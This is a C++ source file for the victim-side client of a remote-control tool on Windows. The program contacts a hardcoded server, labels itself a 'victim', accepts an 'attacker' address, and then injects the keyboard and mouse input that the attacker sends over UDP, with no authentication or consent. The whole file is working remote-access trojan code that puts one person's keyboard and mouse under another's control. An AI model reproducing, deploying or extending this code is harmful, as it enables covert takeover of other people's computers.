using namespace std;
#include <windows.h>
#include <iostream>
#include "wtypes.h"
#include <string>

#pragma comment(lib,"ws2_32.lib")
#pragma warning(disable : 4996)

#define SERVER "192.168.1.211"
#define BUFLEN 1024
#define PORT 8200


INPUT keyboard_input;
INPUT mouse_input;

struct sockaddr_in server_ip;
struct sockaddr_in current_attacker_ip;
struct sockaddr_in last_recieve_ip;


int s, slen = sizeof(server_ip);
char buf[BUFLEN];
char message[BUFLEN] = "victim";
WSADATA wsa;
int horizontal = 0;
int vertical = 0;


void GetDesktopResolution()
{
    RECT desktop;
    const HWND hDesktop = GetDesktopWindow();
    GetWindowRect(hDesktop, &desktop);
    horizontal = desktop.right;
    vertical = desktop.bottom;
};


void move_cursor(int x_percent, int y_percent) {
    SetCursorPos(x_percent * horizontal / 100, y_percent  * vertical / 100);
};

int key_name_to_code(string key_name) {
    return stoi(key_name);
};



void press_key(int code) { //https://help.mjtnet.com/article/262-virtual-key-codes for codes
    keyboard_input.ki.wVk = code;
    keyboard_input.ki.dwFlags = 0;
    SendInput(1, &keyboard_input, sizeof(INPUT));


};

void release_key(int code) {
    keyboard_input.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &keyboard_input, sizeof(INPUT));
};

void handle_input(string input_to_handle) {
    int x,y;
    if ('k' == input_to_handle[0]) {
        if (input_to_handle[1] == 'd') {
            press_key(key_name_to_code(input_to_handle.substr(2, input_to_handle.size() - 2)));
        }
        else if (input_to_handle[1] == 'u') {
            release_key(key_name_to_code(input_to_handle.substr(2, input_to_handle.size() - 2)));
        }
    }
    else if ('m' == input_to_handle[0]) {
        bool flag = false;
        switch (input_to_handle[1]) {
        case ('l') : // left
            flag = true;
            if (input_to_handle[2] == 'd') {
                mouse_input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
            }
            else if (input_to_handle[2] == 'u') {
                mouse_input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
            }
            break;
        case('m') : // midle
            flag = true;
            if (input_to_handle[2] == 'd') {
                mouse_input.mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN;
            }
            else if (input_to_handle[2] == 'u') {
                mouse_input.mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
            }
            break;
        case('r') : // right
            flag = true;
            if (input_to_handle[2] == 'd') {
                mouse_input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
            }
            else if (input_to_handle[2] == 'u') {
                mouse_input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
            }        
            break;
        case('s'): // scroll
            flag = true;
            if (input_to_handle[2] == 'd') {
                mouse_input.mi.dwFlags = MOUSEEVENTF_WHEEL;
                mouse_input.mi.mouseData = -120;
            }
            else if (input_to_handle[2] == 'u') {
                mouse_input.mi.dwFlags = MOUSEEVENTF_WHEEL;
                mouse_input.mi.mouseData = 120;
            }
            break;
        case('M') : // Move
            x = stoi(input_to_handle.substr(2, 3));
            y = stoi(input_to_handle.substr(5, 3));
            move_cursor(x, y);
            break;
        }
        if (flag) {
            SendInput(1, &mouse_input, sizeof(INPUT)); 
            mouse_input.mi.mouseData = 0;
        }

    }
    Sleep(1);

};
bool is_same_ip(sockaddr_in ip1, sockaddr_in ip2) {
    return (ip1.sin_port == ip2.sin_port && ip1.sin_addr.S_un.S_addr == ip2.sin_addr.S_un.S_addr);
}

void handle_packet(char buf[]){
//todo handle a fucking packet
    cout << buf << endl;
    
    if (is_same_ip(last_recieve_ip, server_ip)) { // https://www.digitalocean.com/community/tutorials/convert-string-to-char-array-c-plus-plus
        string x = buf;
        int index_of_space = x.find(" ");
        string ip = x.substr(0, index_of_space);
        string port = x.substr(index_of_space + 1, x.length() - (index_of_space + 1));
        char char_of_ip[16];
        strcpy(char_of_ip, ip.c_str());
        char_of_ip[ip.length()] = '\0';
        current_attacker_ip.sin_addr.S_un.S_addr = inet_addr(char_of_ip); //127.0.0.1 80
        current_attacker_ip.sin_port = htons(stoi(port));

        strcpy(message, string("hello i am ur victim").c_str());
        if (sendto(s, message, strlen(message), 0, (struct sockaddr*)&current_attacker_ip, slen) == SOCKET_ERROR) {
            cout << "fail3" << endl;
        }
    }
    else if (is_same_ip(last_recieve_ip, current_attacker_ip)) {
        handle_input(buf);
    }
}

int main()
{
    //--------------------- some basic setup ----------------------------
    GetDesktopResolution();
    //------------------------ socket setup -----------------------------

    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        cout << "error smthg" << endl;
        return - 1;

    }
    if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR) {
        cout << "error 2" << endl;
        return -1;
    }
    memset((char*)&server_ip, 0, sizeof(server_ip));
    server_ip.sin_family = AF_INET;
    current_attacker_ip.sin_family = AF_INET;
    last_recieve_ip.sin_family = AF_INET;
    server_ip.sin_port = htons(PORT);
    server_ip.sin_addr.S_un.S_addr = inet_addr(SERVER);
    if (sendto(s, message, strlen(message), 0, (struct sockaddr*)&server_ip, slen) == SOCKET_ERROR) {
        cout << "fail3" << endl;
        return -1;
    }
    // ------------------------------------------------------------------
    //--------------------- keyboard input setup ------------------------
    keyboard_input.type = INPUT_KEYBOARD;
    keyboard_input.ki.wScan = 0;
    keyboard_input.ki.time = 0;
    keyboard_input.ki.dwExtraInfo = 0;
    //-------------------------------------------------------------------
    //---------------------- mouse input setup --------------------------
    mouse_input.type = INPUT_MOUSE;
    mouse_input.mi.mouseData = 0;
    mouse_input.mi.time = 0;
    //-------------------------------------------------------------------

    while (true) {
        memset(buf, '\0', BUFLEN);
        if (recvfrom(s, buf, BUFLEN, 0, (struct sockaddr*)&last_recieve_ip, &slen) == SOCKET_ERROR) {
            cout << "error reciving" << endl;
            return -1;
        }
        handle_packet(buf);
    }



    // ---------------------- end of code stuff -------------------------
    closesocket(s);
    WSACleanup();
    return 0;
}